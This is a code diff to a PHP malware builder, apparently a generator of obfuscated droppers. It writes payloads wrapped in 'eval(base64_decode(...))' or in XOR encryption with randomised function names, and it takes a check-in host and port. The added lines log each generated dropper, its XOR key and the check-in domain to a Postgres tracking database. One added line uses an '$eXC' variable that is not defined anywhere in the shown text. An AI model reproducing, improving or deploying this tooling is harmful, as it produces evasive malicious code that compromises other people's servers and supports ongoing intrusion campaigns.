@@ -1,5 +1,6 @@
 <?php
 define('allowed_chars', "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
+require "../db/postgres_checker.php";
 
 class dynamic_generator
 {
@@ -213,6 +214,7 @@ SLEEPER2;
 
     function begin_junk($file, $depth, $out, $mode, bool $encrypt, string $checkInHost, int $checkInPort, int $checkInDuration, $slop)
     {
+        $insertDroppers = new postgres_checker();
         $char_map_lower = array(
             "a" => "\\x61",
             "b" => "\\x62",
@@ -319,11 +321,13 @@ SLEEPER2;
                 case "n":
                     $d = "<?php\neval(base64_decode(\"" . base64_encode(implode("", $b_encoded)) . "\"));\n";
                     fputs(fopen($out, "w"), $d, strlen($d));
+                    $insertDroppers->insertCreatedDropper('no', 'no', 'no', $out, $checkInDuration, $mode, $depth);
+                    $insertDroppers->countUsedDomains($checkInHost);
                     break;
                 case "ob":
                     $out_file = fopen($out, "w");
-                    $key = bin2hex(random_bytes(rand(32, 64)));
-                    echo "XOR Key: {$key}\nXOR Key length: " . strlen($key) . "\n";
+                    $xorkey = bin2hex(random_bytes(rand(32, 64)));
+                    echo "XOR Key: {$xorkey}\nXOR Key length: " . strlen($xorkey) . "\n";
                     fputs($out_file, "<?php\n", strlen("<?php\n"));
                     for ($i = 0; $i <= $depth; $i++) {
                         $ax = $this->randomString();
@@ -335,7 +339,7 @@ SLEEPER2;
                     $encrypted = '';
                     $text = base64_encode(implode("", $b_encoded));
                     foreach (str_split($text) as $char) {
-                        $encrypted .= chr(ord($char) ^ ord($key{$i++ % strlen($key)}));
+                        $encrypted .= chr(ord($char) ^ ord($xorkey{$i++ % strlen($xorkey)}));
                     }
                     $b = base64_encode($encrypted);
                     $fun = substr(str_shuffle(allowed_chars), 0, rand(3, 25));
@@ -347,8 +351,8 @@ SLEEPER2;
                     $iterator = substr(str_shuffle(allowed_chars), 0, rand(3, 15));
                     $tt = substr(str_shuffle(allowed_chars), 0, rand(3, 15));
                     $tt_name = substr(str_shuffle(allowed_chars), 0, rand(3, 15));
-                    if (!is_null($key)) {
-                        $a = "\$" . $f_name . " = \"" . (string)$key . "\";";
+                    if (!is_null($xorkey)) {
+                        $a = "\$" . $f_name . " = \"" . (string)$xorkey . "\";";
                     }
                     $do = <<<FULL
 function $fun(string \$$values)
@@ -373,6 +377,8 @@ $fun(base64_decode("$b"));
 FULL;
                     fputs($out_file, $do, strlen($do));
                     fclose($out_file);
+                    $insertDroppers->insertCreatedDropper($xorkey, '', $eXC['key'].$eXC['IV'].$eXC['Tag'], $out_file, $checkInDuration, $mode, $depth);
+                    $insertDroppers->countUsedDomains($checkInHost);
                     break;
             }
         } else {
